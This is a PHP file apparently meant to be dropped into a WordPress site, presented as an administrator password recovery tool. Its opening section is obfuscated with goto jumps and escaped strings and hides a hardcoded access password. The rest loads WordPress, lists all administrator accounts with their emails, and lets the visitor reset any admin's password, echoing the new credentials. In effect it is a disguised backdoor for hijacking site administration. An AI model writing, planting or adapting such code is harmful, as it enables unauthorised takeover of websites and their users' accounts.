<?php
 goto tpSuO; Q1bjT: ic2ba: goto DmYJa; aDJnN: error_reporting(E_ALL); goto GB0QR; gvmyI: goto jC9eY; goto UhWSt; V6mLT: ini_set("\x64\x69\163\x70\154\141\171\137\145\x72\162\x6f\162\x73", 1); goto XZVWc; FCuJ_: zZxlj: goto aDJnN; S3BcD: jC9eY: goto F1Nd6; F1Nd6: session_start(); goto uKXdd; GB0QR: goto xZTRE; goto S3BcD; XZVWc: goto ic2ba; goto FCuJ_; tpSuO: goto zZxlj; goto Q1bjT; UhWSt: xZTRE: goto V6mLT; DmYJa: $tool_pass = "\147\141\71\x36\70\x38"; goto gvmyI; uKXdd: if (empty($_SESSION["\164\x6f\157\x6c\137\x61\165\x74\x68"])) { if (isset($_POST["\166\145\x72\151\146\171"])) { if ($_POST["\164\157\157\154\x5f\160\x61\163\x73\x77\157\x72\144"] === $tool_pass) { $_SESSION["\164\x6f\157\154\x5f\141\165\x74\150"] = true; } else { die("\341\214\214\341\214\213\x20\xe1\212\x93\xe1\x8b\xad\40\xe1\x88\x98\xe1\212\245\341\211\260\341\x8b\x8a\x20\xe1\210\235\341\210\x8d\341\x8a\xad\341\211\265\x20\341\211\x83\xe1\210\215\341\215\xa2"); } } else { echo "\xa\40\40\x20\40\40\40\x20\x20\74\x68\63\76\127\157\162\144\x50\x72\x65\x73\x73\xe5\xaf\206\347\240\x81\xe6\x81\242\345\244\215\xe5\xb7\xa5\345\x85\xb7\74\x2f\150\63\76\12\x20\40\40\40\40\40\40\x20\x3c\x66\x6f\162\155\x20\x6d\145\x74\x68\157\144\x3d\x22\x70\x6f\x73\x74\42\76\xa\x20\40\40\x20\x20\x20\x20\40\x3c\151\x6e\160\165\x74\x20\164\x79\160\x65\x3d\x22\x70\x61\163\163\x77\x6f\162\144\x22\x20\x6e\x61\155\145\75\x22\164\157\x6f\154\x5f\x70\x61\x73\163\167\157\162\144\42\x3e\xa\40\40\40\40\40\x20\40\x20\74\x62\x75\x74\x74\x6f\x6e\x20\x6e\141\x6d\145\x3d\42\166\145\162\151\146\x79\42\x3e\350\xbf\x9b\xe5\x85\xa5\x3c\57\x62\165\164\164\x6f\156\x3e\12\40\x20\40\x20\40\x20\40\x20\74\57\146\x6f\x72\155\x3e"; die; } }



/* 加载WP */
$wp_status=false;

$wp_locations=[
    __DIR__.'/wp-load.php',
    dirname(__DIR__).'/wp-load.php',
    dirname(dirname(__DIR__)).'/wp-load.php',
    $_SERVER['DOCUMENT_ROOT'].'/wp-load.php'
];


foreach($wp_locations as $wp_file){

    if(file_exists($wp_file)){

        require_once $wp_file;
        $wp_status=true;
        break;

    }

}


if(!$wp_status || !function_exists('get_users')){

    die("WordPress加载失败");

}



/* 生成密码 */
function build_random_pass($size=12){

    $pool="abcdefghijkmnpqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789!@#$";

    $result="";

    for($n=0;$n<$size;$n++){

        $result.=$pool[random_int(0,strlen($pool)-1)];

    }

    return $result;

}



/* 修改密码 */
if(isset($_POST['change_pass'])){


    $target_uid=intval($_POST['target_uid']);


    $target_user=get_user_by(
        'id',
        $target_uid
    );


    if(!$target_user){

        die("用户不存在");

    }


    $new_pass=trim($_POST['new_pass']);


    if(!$new_pass){

        $new_pass=build_random_pass();

    }


    wp_set_password(
        $new_pass,
        $target_uid
    );


    echo "
    <h2 style='color:green'>
    修改成功
    </h2>

    用户名：
    <b>{$target_user->user_login}</b>

    <br><br>

    邮箱：
    {$target_user->user_email}

    <br><br>

    用户ID：
    {$target_uid}

    <br><br>

    新密码：
    <b>{$new_pass}</b>

    ";

    exit;

}



/* 获取管理员 */
$admin_list=get_users([

    'role'=>'administrator',
    'number'=>500,
    'orderby'=>'ID',
    'order'=>'ASC'

]);

?>


<h2>WordPress管理员密码恢复</h2>


<form method="post">


ⴼⵔⴻⵏ ⴰⵎⴹⴻⴱⴱⴻⵔ:

<br>


<select name="target_uid" style="width:350px">


<?php
 foreach ($admin_list as $admin) { ?>
<option value="<?php  echo $admin->ID; ?>
">ID:<?php  echo $admin->ID; echo esc_html($admin->user_login); ?>
(<?php  echo esc_html($admin->user_email); ?>
)</option><?php  } ?>


</select>


<br><br>


新密码：

<br>


<input name="new_pass" placeholder="留空自动生成">


<br><br>


<button name="change_pass">

修改密码

</button>


</form>